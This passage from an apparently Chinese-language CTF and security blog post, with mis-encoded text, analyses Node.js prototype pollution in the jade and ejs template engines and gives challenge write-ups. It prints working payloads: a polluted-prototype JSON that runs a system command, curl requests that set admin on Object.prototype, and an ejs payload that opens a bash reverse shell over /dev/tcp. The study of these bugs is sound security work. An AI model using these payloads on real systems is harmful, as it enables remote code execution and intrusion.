href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172124317.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172422442.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172602483.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172725768.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124173907879.png"></p><p>js è°ƒè¯•çœŸçš„ä¸€å¨å¨çš„ Orz</p><p>this.engine è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174739562.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174952093.png"></p><p>å¯è§è¿”å›å€¼å¤„ï¼š</p><blockquote><p>return handleTemplateCache(options)(options);</p></blockquote><p>è·Ÿè¿›ä¸€ä¸‹ handleTemplateCache</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001447005.png"></p><p>è·Ÿä¸€ä¸‹ compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001503138.png"></p><p>å…ˆçœ‹ä¸€ä¸‹ parse</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003052754.png"></p><p>parser å†…ï¼Œtokens è¢«å†…éƒ¨ parse åä¼ åˆ° compiler è¢« compileï¼Œèµ‹ä¸º js çš„å€¼ï¼Œjs è¢«éƒ¨åˆ†ä¼ å…¥ body å†…</p><p>çœ‹ä¸€ä¸‹ compileï¼Œå®ƒæ˜¯ compiler çš„å‡½æ•°ï¼Œå» node_module æ‰¾</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003818514.png"></p><p>è¿”å› buf ä¼ å› compile</p><p>è·Ÿè¿› 66 è¡Œ this.visit(this.node);<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082102153.png"></p><p>this.debug=true æ—¶ node.filename è¢« stringify è½¬æ¢ä¸ºå­—ç¬¦ä¸² node.line éšç€è¢« push è¿› buf</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082655288.png"></p><p>this.visitNode(node);éå† ast æ ‘åå›åˆ° compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084259360.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084511998.png"></p><p>node.line è¢«è®°å½•åˆ° fn ä¸­ï¼Œç„¶å</p><blockquote><p>fn = new Function(â€˜locals, jadeâ€™, fn);</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ±¡æŸ“ç‚¹å°±å‡ºæ¥äº†ï¼Œ<strong>æ±¡æŸ“åˆ° node.line å°±å¯ä»¥è¿è¡Œä»£ç äº†</strong></p><h5 id="ç¢°åˆ°é—®é¢˜"><a href="#ç¢°åˆ°é—®é¢˜" class="headerlink" title="ç¢°åˆ°é—®é¢˜"></a>ç¢°åˆ°é—®é¢˜</h5><p>post /login</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›‘è§† node.line å€¼</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173326438.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173359572.png"></p><p>æˆ–è€…<code>Uncaught ReferenceError: node is not defined</code>ï¼Œè¯´æ˜ node.line å­˜åœ¨åŸå§‹çš„å€¼ï¼Œå®ƒä¸ä¼šå» Object æ‰¾æ±¡æŸ“çš„å€¼</p><p>é‡æ–°æ¢³ç†ä¸€ä¸‹è°ƒç”¨æ ˆ</p><blockquote><p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p><ol><li>app.js :: res.render</li><li>jade/lib/index.js :: exports.__express</li><li>jade/lib/index.js :: exports.renderFile<ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li>jade/lib/index.js :: exports.compile<ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol><li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(â€˜locals, jadeâ€™, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol></blockquote><p>è¿›å…¥ app.render åå¯ä»¥çœ‹åˆ°è·å–äº† optionsï¼Œè§¦å‘ app æ¸²æŸ“å¼•æ“è¿›è¡Œæ¸²æŸ“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125170700643.png"></p><p>ç³»åˆ—å‚æ•°è®¾ç½®ç»§ç»­æ­¥è¿‡ï¼Œè¿›å…¥ tryRender</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173138254.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯»æ‰¾åˆ° app çš„æ¸²æŸ“å¼•æ“ï¼Œå¹¶ä¸”è®¾ç½®ä¸º jadeï¼Œå¼€å§‹æ¸²æŸ“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173338485.png"></p><p>this.engine è¿›å…¥ jade åº“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173430135.png"></p><p>å›åˆ° node.line æ‰“ä¸€ä¸‹çœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174150498.png"></p><blockquote><p>TypeError: this[(â€œvisitâ€ + node.type)] is not a function</p></blockquote><p>æ‰¾åˆ° Compiler.visitNodeï¼Œæ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174434191.png"></p><p>æ‹¼æ¥å‘ç°æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œéå† ast æ ‘ï¼Œé€šå¸¸æ˜¯é€šè¿‡â€œvisit+èŠ‚ç‚¹ç±»å‹â€æ¥éå†æ‰€æœ‰èŠ‚ç‚¹çš„ï¼Œè§‚å¯Ÿå…‰æ ‡ï¼ŒæŒ‰ç…§ä»–çš„é»˜è®¤å€¼è®¾ç½®ä¸º Block</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126183747677.png"></p><p>èŠ‚ç‚¹ç±»å‹ä¸åˆè¦æ±‚ï¼Œæµ‹è¯•æ‰€æœ‰èŠ‚ç‚¹ç±»å‹å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode âˆš<br>visitBlockCommentâˆš<br>visitCommentâˆš<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctypeâˆš<br>visitMixinBlockâˆš<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126184235129.png"></p><blockquote><p>TypeError: plugin is not a function</p></blockquote><p>çœ‹æŠ¥é”™è¿˜æ²¡æœ‰å®Œæˆæ¸²æŸ“ï¼Œæ‰¾åˆ° jade æ¸²æŸ“å®Œå‰çš„æœ€åæŠ¥é”™</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126212401866.png"></p><p>æ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰“è¿›å»çš„æ—¶å€™ self æ˜¯ undefinedï¼Œå¯ä»¥æ±¡æŸ“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231450129.png"></p><p>æ±¡æŸ“ title</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231900595.png"></p><p>æ±¡æŸ“ message</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126232004589.png"></p><p>æ±¡æŸ“ errorï¼Œä¸€å¼€å§‹ä¼ äº†ä¸€ä¸ª 1ï¼Œä¼  json æ ¼å¼çš„å†…å®¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¡¥å……ï¼Œå…¶å®æ±¡æŸ“ç›®æ ‡å°±æ˜¯ node.lineï¼Œä¸€å¼€å§‹å°±æ±¡æŸ“ node.line å°±å¯ä»¥çŸ¥é“åªæ±¡æŸ“å“ªäº›å±æ€§å³å¯ï¼Œå› ä¸ºæœ‰äº›å±æ€§ä¸é…ç½®çš„è¯ï¼Œå®ƒè¦ä¹ˆæœ‰é»˜è®¤å€¼ï¼Œè¦ä¹ˆå°±æ˜¯èƒ½éƒ¨åˆ†æ¸²æŸ“æ²¡å®Œæˆï¼Œä¸å½±å“æˆ‘ä»¬çš„æ±¡æŸ“æ•°æ®çš„æ‰§è¡Œ</p><p>å¯¹äºæ™®é€šæ¨¡æ¿ï¼Œåªéœ€è¦æ±¡æŸ“ self å’Œ lineï¼Œæœ‰ç»§æ‰¿çš„æ¨¡æ¿éœ€è¦æ±¡æŸ“ type</p><p>å½“æœ‰é¡¶æ ¼ h=title ç±»å‹çš„éœ€è¦æ±¡æŸ“ block ç±»å‹</p><p>jade å…¥å£ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<br>    options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp;<br>    process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span><br>  ) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>options.compileDebug</code> æ— åˆå§‹å€¼ï¼Œå¯ä»¥è¦†ç›–å¼€å¯ Debug æ¨¡å¼ï¼Œå½“ç„¶ä¹Ÿæœ‰å¦å¤–ä¸€ç§æƒ…å†µï¼Œéƒ¨ç½²æ—¶ï¼Œæ²¡æœ‰æ­£ç¡®é…ç½® <code>req.app.get(&#39;env&#39;)</code> å¯¼è‡´ debug æ¨¡å¼å¼€å¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¹Ÿå¯ä»¥ä¸ç”¨è¦†ç›–ï¼Œä½†ä¸ºäº†ç¡®ä¿é€šç”¨æ€§ï¼Œè¿™é‡Œè¿˜æ˜¯è¦†ç›–ä¸€ä¸‹ï¼Œé˜²æ­¢æ­£ç¡®é…ç½®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;compileDebug&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">1</span> &#125; &#125; &#125;<br></code></pre></td></tr></table></figure><p>å¦å¤–<strong>this.debug</strong>å“ªé‡Œæ¥ï¼Ÿï¼Ÿ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = (<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span> (<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure></blockquote><p>æœ€ç»ˆ Expï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Code&quot;</span>,<br>      <span class="hljs-attr">&quot;self&quot;</span>: <span class="hljs-number">1</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸ªå…¨å®¶ç¦</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211127000013927.png"></p><h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">if</span> (req.url.match(<span class="hljs-regexp">/8c|2c|\,/gi</span>)) &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>)<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query)<br>  <span class="hljs-keyword">if</span> (<br>    query.name === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp;<br>    query.password === <span class="hljs-string">&#x27;ctfshow&#x27;</span> &amp;&amp;<br>    query.isVIP === <span class="hljs-literal">true</span><br>  ) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>)<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>ä¸èƒ½æœ‰ 8cã€2cã€é€—å·</p><p>æ­£å¸¸è¯·æ±‚ï¼š</p><blockquote><p>?query={â€œnameâ€:â€adminâ€,â€passwordâ€:â€ctfshowâ€,â€isVIPâ€:true}</p></blockquote><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹ HPP æ•°æ®æ±¡æŸ“</p><blockquote><p>Web æœåŠ¡å™¨ ã€€ã€€ã€€ã€€ã€€ã€€ å‚æ•°è·å–å‡½æ•° ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ è·å–åˆ°çš„å‚æ•°</p><p>PHP/Apache ã€€ã€€ ã€€ã€€ $_GET(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ Last</p><p>JSP/Tomcat ã€€ã€€ã€€ã€€ Request.getParameter(â€œparâ€) First</p><p>Perl(CGI)/Apache ã€€ Param(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ First</p><p>Python/Apache ã€€ã€€ getvalue(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ All(List)</p><p>ASP/IIS ã€€ã€€ã€€ã€€ã€€ã€€ Request.QueryString(â€œparâ€) ã€€ã€€ All (comma-delimited string)</p></blockquote><p>è€Œ nodejs å°±æ˜¯ä¼šå°†åŒåå‚æ•°ä»¥æ•°ç»„è¿›è¡Œå­˜å‚¨ï¼Œjson.parse ä¹Ÿèƒ½æ­£å¸¸è§£æ</p><blockquote><p>?query={â€œnameâ€:â€adminâ€&amp;query=â€passwordâ€:â€ctfshowâ€&amp;query=â€isVIPâ€:true}</p></blockquote><p>é€—å·å·²ç»ç»•è¿‡ï¼Œurl ç¼–ç çœ‹ä¸€ä¸‹</p><blockquote><p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p></blockquote><p>ctfshow å‰é¢å‡ºç°äº†ä¸€ä¸ª%22ï¼Œæ˜¯åŒå¼•å·ï¼Œå’Œ c æˆäº† 2cï¼Œc å¾—ç»•ä¸€ä¸‹ï¼Œè¿›è¡Œ unicode ç¼–ç ä¸€ä¸‹%63</p><p>payloadï¼š</p><blockquote><p>?query={â€œnameâ€:â€adminâ€&amp;query=â€passwordâ€:â€%63tfshowâ€&amp;query=â€isVIPâ€:true}</p></blockquote><h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span><br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr]<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span> (<span class="hljs-params">a</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a)<br>&#125;<br><br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span><br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br><span class="hljs-keyword">const</span> admin = &#123;&#125;<br><br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.json())<br>app.use(cookieParser())<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)))<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body))<br>  <span class="hljs-keyword">var</span> copybody = clone(body)<br>  <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>    res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>      <span class="hljs-attr">done</span>: <span class="hljs-string">&#x27;cookie set&#x27;</span><br>    &#125;)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.json(&#123;<br>      <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;cookie not set&#x27;</span><br>    &#125;)<br>  &#125;<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> Ğ°dmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>  <span class="hljs-keyword">if</span> (admin.Ğ°dmin == <span class="hljs-number">1</span>) &#123;<br>    res.send(<span class="hljs-string">&#x27;hackim19&#123;&#125;&#x27;</span>)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-string">&#x27;You are not authorized&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.listen(PORT, HOST)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;;<br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¯·æ±‚ /signup æ¥å£ï¼Œåœ¨ NodeJS æœåŠ¡ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨äº†æœ‰æ¼æ´çš„ merge æ–¹æ³•ï¼Œå¹¶é€šè¿‡ __proto__ ä¸º Object.prototypeï¼ˆå› ä¸º {}.__proto__ === Object.prototypeï¼‰ æ·»åŠ ä¸Šä¸€ä¸ªæ–°çš„å±æ€§ adminï¼Œä¸”å€¼ä¸º 1ã€‚</p><p>å†æ¬¡è¯·æ±‚ getFlag æ¥å£ï¼Œæ¡ä»¶è¯­å¥ admin.Ğ°dmin == 1 ä¸º trueï¼ŒæœåŠ¡è¢«æ”»å‡»ã€‚</p><p>æ”»å‡»æ¡ˆä¾‹å‡ºè‡ªï¼šPrototype pollution attacks in NodeJS applications</p><p>è¿™æ ·çš„æ¼æ´åœ¨ jQuery $.extend ä¸­ä¹Ÿç»å¸¸è§åˆ°<br>å¯¹äº jQueryï¼šå¦‚æœæ‹…å¿ƒå®‰å…¨é—®é¢˜ï¼Œå»ºè®®å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬ jQuery 3.4.0ï¼Œå¦‚æœè¿˜åœ¨ä½¿ç”¨ jQuery çš„ 1.x å’Œ 2.x ç‰ˆæœ¬ï¼Œé‚£ä¹ˆä½ çš„åº”ç”¨ç¨‹åºå’Œç½‘ç«™ä»æœ‰å¯èƒ½é­å—æ”»å‡»ã€‚</p><h4 id="ç™»å½•ç»•è¿‡é¢˜"><a href="#ç™»å½•ç»•è¿‡é¢˜" class="headerlink" title="ç™»å½•ç»•è¿‡é¢˜"></a>ç™»å½•ç»•è¿‡é¢˜</h4><p>{â€œuserâ€:[0],â€passwdâ€:[0]}</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png"></p><p>è¿™é¢˜å¯ä»¥æ§åˆ¶ host å‚æ•°å»ç¯¡æ”¹ mysql çš„è¿æ¥åœ°å€ åˆ©ç”¨ mysql å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶è¯»å– <a href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p><p>ä½†æ˜¯å¦‚æœç›´æ¥åœ¨ json ä¸­ä¼ é€’{â€œhostâ€:â€â€},æ ¹æœ¬ä¸ä¼šæœ‰ä»»ä½•æ•ˆæœ<br>åœ¨ 57 è¡Œ<br><code>if (body.host != undefined) &#123;</code><br>å¦‚æœå‘ç°æœ‰ç›´æ¥ä¼ é€’è¿›æ¥çš„ host å‚æ•°ï¼Œnodejs å°±æŠ¥é”™é€€å‡ºï¼Œæ‰€ä»¥ï¼Œé€šè¿‡ä»”ç»†è§‚å¯Ÿæºä»£ç ï¼Œå‘ç°è¿™ä¸ªä»£ç æœ‰å‚æ•°æ±¡æŸ“é—®é¢˜ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ„é€ å¦‚ä¸‹å‚æ•°å»æ”¹å˜ host å‚æ•°ï¼ŒæŠŠ host å‚æ•°å˜æˆæˆ‘ä»¬è‡ªå·± mysql æœåŠ¡å™¨çš„åœ°å€<br>åŸé¢˜ä½œè€…åšå®¢<a href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p><p>ä¸ç”¨ host å‚æ•°ç¯¡æ”¹ mysql åœ°å€ è¿˜å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ï¼š<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 